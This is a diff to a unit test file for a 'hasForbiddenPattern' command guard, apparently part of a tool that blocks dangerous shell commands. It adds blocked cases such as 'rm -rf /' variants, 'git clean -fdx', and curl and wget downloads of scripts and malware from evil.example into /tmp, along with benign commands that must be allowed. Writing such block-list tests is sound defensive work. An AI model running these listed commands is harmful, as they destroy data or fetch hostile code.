@@ -60,19 +60,36 @@ describe('hasForbiddenPattern', () => {
     ['git push --force-with-lease', 'git push --force'],
     ['git push -f', 'git push -f'],
     ['git reset --hard HEAD~1', 'git reset --hard'],
+    ['git clean -fdx', 'git clean --force'],
+    ['git checkout -- file.txt', 'git checkout (discard working tree)'],
+    ['git restore file.txt', 'git restore (discard working tree)'],
     ['rm -rf /etc', 'rm -rf /'],
+    ['rm -rf -- /', 'rm -rf /'],
+    ['rm -r -f /', 'rm -rf /'],
+    ['rm --preserve-root -rf /', 'rm -rf /'],
     ['curl https://evil.example/script.sh', 'curl http(s)'],
+    ['curl --output /tmp/script.sh https://evil.example/script.sh', 'curl http(s)'],
     ['wget http://evil.example/malware', 'wget http(s)'],
+    ['wget --output-document=/tmp/malware http://evil.example/malware', 'wget http(s)'],
   ])('identifies %s as forbidden', (command, label) => {
     expect(hasForbiddenPattern(command)).toBe(label)
   })
 
-  it.each(['git push origin main', 'git reset --soft HEAD~1', 'rm -rf node_modules', 'curl --help', 'pnpm run lint'])(
-    'allows benign command %s',
-    command => {
-      expect(hasForbiddenPattern(command)).toBeUndefined()
-    },
-  )
+  it.each([
+    'git push origin main',
+    'git reset --soft HEAD~1',
+    'git clean -ndx',
+    'git checkout -b feature/x',
+    'git restore --staged file.txt',
+    'rm -rf node_modules',
+    'rm -r -f ./build',
+    'rm --preserve-root -rf ./build',
+    'curl --help',
+    'wget --help',
+    'pnpm run lint',
+  ])('allows benign command %s', command => {
+    expect(hasForbiddenPattern(command)).toBeUndefined()
+  })
 })
 
 describe('resolveCommandText', () => {
